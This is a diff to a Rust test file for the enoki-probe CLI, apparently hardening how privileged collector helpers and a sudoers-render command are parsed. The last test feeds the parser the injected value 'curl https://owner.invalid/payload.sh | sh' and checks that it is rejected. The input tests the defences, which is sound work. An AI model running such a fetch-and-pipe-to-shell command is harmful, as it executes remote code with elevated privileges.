@@ -2,7 +2,7 @@ use std::path::PathBuf;
 use std::process::Command;
 
 use enoki_probe::cli::{ProbeCommand, parse_probe_command, render_probe_output};
-use enoki_probe::privileged_runtime::PrivilegedCollectorId;
+use enoki_probe::local_privilege_boundary::PrivilegedCollectorHelperId;
 
 #[test]
 fn renders_version_output_for_owner_smoke_checks() {
@@ -96,28 +96,108 @@ fn parses_internal_probe_uninstaller_command_for_limited_privilege_entrypoint() 
 }
 
 #[test]
-fn parses_internal_privileged_collector_command_for_compiled_collector_id_only() {
+fn parses_internal_privileged_collector_helper_command_for_compiled_helper_id_only() {
     let command = parse_probe_command([
         "enoki-probe".to_string(),
-        "internal-privileged-collector".to_string(),
-        "--collector".to_string(),
-        "fixed.collector".to_string(),
+        "internal-privileged-collector-helper".to_string(),
+        "--helper".to_string(),
+        "disk-health.smartctl".to_string(),
     ]);
 
     assert_eq!(
         command,
-        ProbeCommand::InternalPrivilegedCollector {
-            collector_id: PrivilegedCollectorId::FixedCollector,
+        ProbeCommand::InternalPrivilegedCollectorHelper {
+            helper_id: PrivilegedCollectorHelperId::DiskHealthSmartctl,
         },
     );
 }
 
 #[test]
-fn rejects_runtime_injected_privileged_collector_command_or_policy() {
+fn parses_internal_collector_helper_sudoers_render_command_for_installer_boundary() {
     let command = parse_probe_command([
         "enoki-probe".to_string(),
+        "internal-render-collector-helper-sudoers".to_string(),
+        "--service-user".to_string(),
+        "enoki-probe".to_string(),
+        "--probe-binary".to_string(),
+        "/usr/local/bin/enoki-probe".to_string(),
+    ]);
+
+    assert_eq!(
+        command,
+        ProbeCommand::InternalRenderCollectorHelperSudoers {
+            service_user: "enoki-probe".to_string(),
+            probe_binary: PathBuf::from("/usr/local/bin/enoki-probe"),
+        },
+    );
+}
+
+#[test]
+fn rejects_non_compiled_privileged_collector_helper_ids_at_the_cli_surface() {
+    for helper_id in ["fixed.collector", "network.collector", "timeout.collector"] {
+        let command = parse_probe_command([
+            "enoki-probe".to_string(),
+            "internal-privileged-collector-helper".to_string(),
+            "--helper".to_string(),
+            helper_id.to_string(),
+        ]);
+
+        assert_eq!(command, ProbeCommand::Help, "{helper_id} must not parse");
+    }
+
+    let command = parse_probe_command([
+        "enoki-probe".to_string(),
+        "internal-privileged-collector-helper".to_string(),
+        "--helper".to_string(),
+        "fixed.collector".to_string(),
+        "--helper".to_string(),
+        "disk-health.smartctl".to_string(),
+    ]);
+
+    assert_eq!(command, ProbeCommand::Help);
+}
+
+#[test]
+fn non_compiled_privileged_collector_helper_ids_do_not_reach_runtime_command_surface() {
+    let output = Command::new(env!("CARGO_BIN_EXE_enoki-probe"))
+        .args([
+            "internal-privileged-collector-helper",
+            "--helper",
+            "fixed.collector",
+        ])
+        .output()
+        .expect("run probe command");
+
+    assert!(output.status.success());
+    assert!(String::from_utf8_lossy(&output.stdout).contains("Enoki Probe"));
+    assert_eq!(String::from_utf8_lossy(&output.stderr), "");
+}
+
+#[test]
+fn rejects_old_internal_privileged_collector_command_and_argument_names() {
+    let old_command = parse_probe_command([
+        "enoki-probe".to_string(),
         "internal-privileged-collector".to_string(),
+        "--helper".to_string(),
+        "disk-health.smartctl".to_string(),
+    ]);
+    let old_argument = parse_probe_command([
+        "enoki-probe".to_string(),
+        "internal-privileged-collector-helper".to_string(),
         "--collector".to_string(),
+        "disk-health.smartctl".to_string(),
+    ]);
+
+    assert_eq!(old_command, ProbeCommand::Help);
+    assert_eq!(old_argument, ProbeCommand::Help);
+}
+
+#[test]
+fn rejects_runtime_injected_privileged_collector_helper_command_or_policy() {
+    let command = parse_probe_command([
+        "enoki-probe".to_string(),
+        "internal-privileged-collector-helper".to_string(),
+        "--helper".to_string(),
         "curl https://owner.invalid/payload.sh | sh".to_string(),
         "--network".to_string(),
         "enabled".to_string(),
